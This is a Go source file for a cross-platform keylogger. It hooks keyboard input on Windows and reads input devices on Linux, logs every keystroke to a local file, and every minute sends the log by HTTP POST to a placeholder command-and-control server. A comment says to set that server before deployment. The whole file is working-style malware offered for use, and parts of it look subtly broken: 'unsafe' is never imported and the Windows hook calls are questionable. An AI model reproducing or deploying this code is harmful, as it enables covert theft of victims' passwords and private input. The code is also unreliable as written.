package keylogger

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"runtime"
	"strings"
	"time"

	"github.com/MarinX/keylogger" // Linux Keylogging
	"golang.org/x/sys/windows"
)

// C2 Server URL (Modify this before deployment)
const c2ServerURL = "http://your-c2-server.com/keystrokes"

// Capture Keystrokes (Windows)
func captureWindowsKeys() {
	fmt.Println("[+] Starting Windows keylogger...")

	hook, err := windows.SetWindowsHookEx(windows.WH_KEYBOARD_LL, windows.HOOKPROC(func(nCode int, wparam uintptr, lparam uintptr) uintptr {
		if nCode >= 0 {
			keyInfo := (*windows.KBDLLHOOKSTRUCT)(unsafe.Pointer(lparam))
			key := fmt.Sprintf("%d ", keyInfo.VkCode)
			saveKeystroke(key)
		}
		return windows.CallNextHookEx(0, nCode, wparam, lparam)
	}), 0, 0)

	if err != nil {
		fmt.Println("[!] Failed to set Windows hook:", err)
		return
	}

	defer windows.UnhookWindowsHookEx(hook)
	select {}
}

// Capture Keystrokes (Linux)
func captureLinuxKeys() {
	fmt.Println("[+] Starting Linux keylogger...")

	devices, err := keylogger.NewDevices()
	if err != nil {
		fmt.Println("[!] No keyboard devices found:", err)
		return
	}

	for _, dev := range devices {
		go func(device string) {
			k, err := keylogger.New(device)
			if err != nil {
				fmt.Println("[!] Error opening device:", err)
				return
			}
			defer k.Close()

			for e := range k.Read() {
				if e.Type == keylogger.EvKey && e.KeyPress() {
					saveKeystroke(e.KeyString())
				}
			}
		}(dev)
	}

	select {}
}

// Save Keystrokes Locally
func saveKeystroke(key string) {
	file, _ := os.OpenFile("keystrokes.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	defer file.Close()
	file.WriteString(key + "\n")
}

// Send Keystrokes to C2
func sendKeystrokesToC2() {
	for {
		data, err := ioutil.ReadFile("keystrokes.log")
		if err != nil {
			fmt.Println("[!] Error reading log file:", err)
			time.Sleep(30 * time.Second)
			continue
		}

		if len(data) > 0 {
			http.Post(c2ServerURL, "text/plain", strings.NewReader(string(data)))
			os.Truncate("keystrokes.log", 0) // Clear log file after sending
		}

		time.Sleep(60 * time.Second) // Send logs every minute
	}
}

// Start Keylogger
func StartKeylogger() {
	if runtime.GOOS == "windows" {
		go captureWindowsKeys()
	} else if runtime.GOOS == "linux" {
		go captureLinuxKeys()
	} else {
		fmt.Println("[!] Unsupported OS for keylogging.")
	}
	go sendKeystrokesToC2()
}
